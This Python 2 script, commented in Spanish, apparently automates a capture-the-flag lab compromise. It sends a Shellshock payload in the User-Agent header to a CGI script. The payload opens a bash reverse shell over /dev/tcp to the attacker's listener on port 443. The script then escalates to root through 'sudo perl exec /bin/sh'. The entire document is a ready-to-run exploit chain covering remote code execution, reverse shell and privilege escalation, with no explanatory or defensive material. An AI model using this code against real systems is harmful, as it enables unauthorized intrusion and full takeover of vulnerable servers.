#!/usr/bin/python
#coding: utf-8

import requests, time, sys, threading
from pwn import *

# sudo apt-get install pipenv
# pipenv --python 2.7 shell
# pip install pwn

# Declaración de Variables
url = "http://10.10.10.56/cgi-bin/user.sh"
lport = 443

def obtainShell():
	try:
		headers_data = {
			'User-Agent':"() { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.87/443 0>&1'"
		}
		
		p1 = log.progress("Shellshock")
		p1.status("Realizando petición WEB")
		time.sleep(2)

		r = requests.get(url, headers=headers_data, timeout=1)
		
		p1.success('Shellshock explotado con éxito')
		time.sleep(1)

	except requests.exceptions.ReadTimeout:
		p1.success('Shellshock explotado con éxito')
	except:
		print " \n[*] Ha ocurrido un error ....\n"
		sys.exit()

if __name__ == '__main__':
	try:
		threading.Thread(target=obtainShell).start()
	except Exception as e:
		log.error(str(e))

	shell = listen(lport, timeout=20).wait_for_connection()

	if shell.sock is None:
		log.failure("No se ha obtenido ninguna conexión")
		sys.exit()
	else:
		log.success("Se ha obtenido una conexión")
		time.sleep(1)

	shell.sendline("""sudo perl -e 'exec "/bin/sh";'""")
	shell.interactive()
